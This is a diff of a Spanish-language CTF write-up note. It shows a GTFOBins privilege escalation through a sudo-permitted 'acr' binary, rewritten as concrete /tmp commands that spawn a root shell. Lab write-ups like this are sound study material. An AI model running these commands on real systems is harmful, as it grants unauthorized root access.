@@ -335,12 +335,13 @@ SI hacemos **sudo -l** lo tipico para ver si el usuario tiene permisos d eejecut
 SI buscamos en GTFObins que es acr, vemos que hay tres lineas que podemos ejecutar para escalar a root:
 
 ```zsh
-echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
-chmod +x /path/to/temp-file
-acr -r ./relative/path/to/temp-file
+echo -e 'x:\n\t/bin/sh 1>&0 2>&0' > /tmp/exploit.acr
+cd /tmp
+chmod +x exploit.acr
+acr -r ./exploit.acr
 ```
 
 SI lo ejecutamos:
 
 
-
+![[Pasted image 20260824233342.png]]
